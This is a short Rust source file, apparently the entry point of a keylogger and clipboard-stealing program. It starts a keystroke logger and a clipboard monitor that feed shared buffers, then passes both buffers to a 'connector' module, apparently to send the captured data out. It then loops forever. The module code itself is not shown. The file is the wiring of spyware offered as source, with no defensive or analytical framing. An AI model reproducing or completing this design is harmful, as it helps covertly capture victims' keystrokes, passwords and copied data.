use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use Redox::schema::key_logger::KeyLoggData;
use crate::clipboard::start_clipboard;
use crate::connector::start_connector;
use crate::keylogger::start_logger;

mod keylogger;
mod clipboard;
mod connector;
mod handler;

#[tokio::main]
async fn main() {
    let key_log_mem: Arc<Mutex<Vec<KeyLoggData>>> = Arc::new(Mutex::new(Vec::new()));
    let clipboard_mem: Arc<Mutex<HashMap<String, String>>> = Arc::new(Mutex::new(HashMap::new()));
    start_logger(key_log_mem.clone());
    start_clipboard(clipboard_mem.clone());
    start_connector(key_log_mem.clone(), clipboard_mem.clone()).await;
    loop {}
}


